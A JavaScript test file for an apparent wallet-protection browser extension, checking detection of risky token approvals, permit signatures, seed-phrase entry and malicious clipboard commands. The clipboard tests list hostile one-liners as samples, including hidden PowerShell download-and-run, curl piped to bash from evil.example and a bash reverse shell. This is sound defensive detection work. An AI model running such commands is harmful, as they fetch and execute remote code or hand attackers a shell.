// Run with: node tests/guards.test.js
const assert = require("node:assert");
require("../src/bip39.js");
const { classify, classifyClipboard } = require("../src/rules.js");
const { looksLikePastedSeed, looksLikeTypedSeed } = require("../src/guard.js");

const pad = (hex) => hex.replace(/^0x/, "").padStart(64, "0");
const A = "0x1111111111111111111111111111111111111111";
const TOKEN = "0x2222222222222222222222222222222222222222";
const call = (sel, ...words) => sel + words.map(pad).join("");
const MAXU = "f".repeat(64);
let n = 0;
const ok = (cond, msg) => { assert.ok(cond, msg); n++; };
const lvl = (r) => (r ? r.level : null);

// --- wallet transactions
ok(lvl(classify("eth_sendTransaction", [{ to: TOKEN, data: call("0x095ea7b3", A, MAXU) }])) === "high", "unlimited approve = high");
ok(lvl(classify("eth_sendTransaction", [{ to: TOKEN, data: call("0x095ea7b3", A, "3b9aca00") }])) === "medium", "small approve = medium");
ok(lvl(classify("eth_sendTransaction", [{ to: TOKEN, data: call("0xa22cb465", A, "1") }])) === "high", "setApprovalForAll(true) = high");
ok(classify("eth_sendTransaction", [{ to: TOKEN, data: call("0xa22cb465", A, "0") }]) === null, "setApprovalForAll(false) = fine");
ok(lvl(classify("eth_sendTransaction", [{ to: TOKEN, data: call("0x39509351", A, MAXU) }])) === "high", "increaseAllowance huge = high");
ok(lvl(classify("eth_sendTransaction", [{ to: A, data: call("0x87517c45", TOKEN, A, MAXU, "0") }])) === "high", "Permit2.approve = high");
ok(classify("eth_sendTransaction", [{ to: TOKEN, data: call("0xa9059cbb", A, "64") }]) === null, "plain transfer = fine");
ok(classify("eth_sendTransaction", [{ to: A, value: "0x1" }]) === null, "plain ETH send = fine");
ok(lvl(classify("wallet_sendCalls", [{ calls: [{ to: TOKEN, data: "0x" }, { to: TOKEN, data: call("0x095ea7b3", A, MAXU) }] }])) === "high", "batched calls inspected");

// --- typed data
const permit = { primaryType: "Permit", domain: { name: "USD Coin" }, message: { spender: A, value: "1" } };
ok(lvl(classify("eth_signTypedData_v4", [A, JSON.stringify(permit)])) === "high", "EIP-2612 Permit = high");
for (const pt of ["PermitSingle", "PermitBatch", "PermitTransferFrom", "PermitBatchTransferFrom", "PermitWitnessTransferFrom"]) {
  ok(lvl(classify("eth_signTypedData_v4", [A, JSON.stringify({ primaryType: pt, domain: { name: "Permit2" }, message: {} })])) === "high", `${pt} = high`);
}
ok(lvl(classify("eth_signTypedData_v4", [A, JSON.stringify({ primaryType: "OrderComponents", domain: { name: "Seaport" }, message: {} })])) === "high", "Seaport order = high");
ok(lvl(classify("eth_signTypedData_v4", [A, JSON.stringify({ primaryType: "Delegation", domain: { name: "X" }, message: {} })])) === "high", "delegation = high");
ok(classify("eth_signTypedData_v4", [A, JSON.stringify({ primaryType: "Mail", domain: { name: "Ether Mail" }, message: {} })]) === null, "harmless typed data = fine");
ok(classify("eth_signTypedData_v4", [A, "not json"]) === null, "garbage typed data doesn't crash");

// --- raw signing
ok(lvl(classify("eth_sign", [A, "0x" + "ab".repeat(32)])) === "high", "eth_sign = high");
ok(lvl(classify("personal_sign", ["0x" + "ab".repeat(32), A])) === "high", "personal_sign of a 32-byte hash = high");
ok(classify("personal_sign", ["0x" + Buffer.from("Sign in to Example\nNonce: 42").toString("hex"), A]) === null, "readable SIWE-style message = fine");

// --- non-wallet calls untouched, risky-site escalation
ok(classify("eth_chainId", []) === null && classify("eth_requestAccounts", []) === null, "read-only calls untouched");
ok(lvl(classify("eth_sendTransaction", [{ to: A, value: "0x1" }], { risky: true })) === "medium", "any tx on exposed site = medium");
ok(classify("eth_requestAccounts", [], { risky: true }) === null, "connecting isn't blocked even on exposed sites");

// --- clipboard
const bad = [
  'powershell -w hidden -c "iwr http://evil/x.ps1 | iex"',
  "mshta https://evil.example/verify.hta",
  "cmd /c start /min powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
  "curl -fsSL https://evil.example/i.sh | bash",
  "echo aGVsbG8K | base64 -d | sh",
  'osascript -e \'do shell script "curl evil | sh"\'',
  "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
];
for (const b of bad) ok(classifyClipboard(b) && classifyClipboard(b).level === "high", `clipboard: ${b.slice(0, 30)}`);
for (const g of ["0x1111111111111111111111111111111111111111", "Hello world", "npm install phpeek", "https://example.com/page", "SELECT * FROM users"]) {
  ok(classifyClipboard(g) === null, `clipboard fine: ${g}`);
}

// --- seed phrases
const seed12 = "abandon ability able about above absent absorb abstract absurd abuse access accident";
const seed24 = seed12 + " account accuse achieve acid acoustic acquire across act action actor actress actual";
ok(looksLikePastedSeed(seed12) && looksLikePastedSeed(seed24), "12/24-word paste detected");
ok(looksLikePastedSeed("1. abandon 2. ability 3. able 4. about 5. above 6. absent 7. absorb 8. abstract 9. absurd 10. abuse 11. access 12. accident"), "numbered paste detected");
ok(looksLikePastedSeed(seed12.split(" ").join(",\n")), "comma/newline paste detected");
ok(!looksLikePastedSeed("abandon ability able about above"), "5 words is not a full paste");
ok(looksLikeTypedSeed("abandon ability able about above absent"), "6 typed seed words trip");
ok(!looksLikeTypedSeed("abandon ability able about above"), "5 words don't trip in a normal field");
ok(looksLikeTypedSeed("abandon ability able", 3), "3 words trip in a seed-looking field");
for (const s of ["fresh fish market open today", "dinner table wood oak round", "black leather jacket size medium",
  "winter jacket waterproof warm black", "video game controller wireless black"]) {
  ok(!looksLikeTypedSeed(s), `no false positive on search: "${s}"`);
}
const sentences = [
  "I will meet you at the coffee shop tomorrow morning",
  "Please send the invoice to my email address today",
  "The quick brown fox jumps over the lazy dog",
  "Can you check the order status for my account please",
  "great product fast delivery would buy again",
];
for (const s of sentences) ok(!looksLikeTypedSeed(s) && !looksLikePastedSeed(s), `no false positive: "${s}"`);
ok(!looksLikeTypedSeed("abandon ability able about above absent!"), "punctuation like ! means it's prose");

console.log(`guards tests passed (${n} checks)`);

// --- v1.1 hardening (after independent review)
const { render } = require("../src/background.js");
const { fieldHint } = require("../src/guard.js");
ok(render({ code: "nope", f: {} }) === null, "unknown verdict code is refused");
const phish = render({ code: "market-order", f: { domain: "Wallet compromised: restore at evil.example" } });
ok(!JSON.stringify(phish).includes("evil.example"), "page text never reaches the PHPeek window");
const bogus = render({ code: "approve-unlimited", f: { who: "visit evil.example now", token: "x" } });
ok(!JSON.stringify(bogus).includes("evil"), "non-address values are replaced");
ok(render({ code: "approve", f: {} }, true).reasons[0].includes("PHP2Shell"), "exposed site adds the note");
ok(classifyClipboard("p^o^w^e^r^s^h^e^l^l -w h -c iwr x") !== null, "caret-obfuscated powershell caught");
ok(classifyClipboard('bash -c "$(curl -fsSL https://evil.example/i)"') !== null, "macOS $(curl …) form caught");
ok(classifyClipboard("cmd.exe /v /c start calc") !== null, "cmd.exe /v /c caught");
ok(classifyClipboard("finger vke@evil.example | cmd") !== null, "finger | cmd caught");
const { clipboardTier } = require("../src/rules.js");
ok(clipboardTier('zsh -c "$(echo aGk= | base64 -D)"') === "critical", "zsh $(… base64 -D) caught as critical");
ok(clipboardTier("mshta https://x/y.hta") === "critical" && clipboardTier("powershell -w hidden -c iwr x|iex") === "critical", "hidden powershell is critical");
ok(clipboardTier("irm get.scoop.sh | iex") === "install" && clipboardTier("curl -sSf https://sh.rustup.rs | sh") === "install", "install commands are tier 'install'");
ok(lvl(classify("eth_sendTransaction", [{ to: TOKEN, data: "", input: call("0x095ea7b3", A, MAXU) }])) === "high", "approve in `input` field caught");
ok(lvl(classify("eth_signTypedData_v4", [A, JSON.stringify({ primaryType: "Root", domain: { name: "Blur Exchange" }, message: {} })])) === "high", "Blur bulk order caught");
const fake = (attrs) => ({ type: attrs.type || "text", name: attrs.name || "", id: "", placeholder: attrs.placeholder || "", labels: [],
  getAttribute: () => "", closest: () => null });
ok(fieldHint(fake({ type: "password", name: "password" })) === "password", "password fields are not seed fields");
ok(fieldHint(fake({ name: "mnemonic" })) === "seed", "mnemonic field is a seed field");
ok(fieldHint(fake({ placeholder: "Enter your 12 words recovery phrase" })) === "seed", "recovery phrase placeholder → seed field");
ok(fieldHint(fake({ type: "search" })) === "search", "search field skipped");
ok(looksLikeTypedSeed("jhgfd jhgfju retytet abandon ability able", 3), "junk before a seed in a seed field still trips");
ok(looksLikeTypedSeed("hi support, here it is: abandon ability able about above absent absorb abstract"), "seed after a sentence trips at 8 words");
ok(!looksLikeTypedSeed("hi support, here it is: abandon ability able about above absent absorb"), "…but not at 7 in a normal field");
const prose = "Thank you for your order. We will ship your fresh coffee beans tomorrow morning and send the tracking number by email. Please check the spam folder if you do not see it within one day.";
ok(!looksLikeTypedSeed(prose), "normal prose doesn't trip");
console.log(`hardening checks passed (total ${n})`);
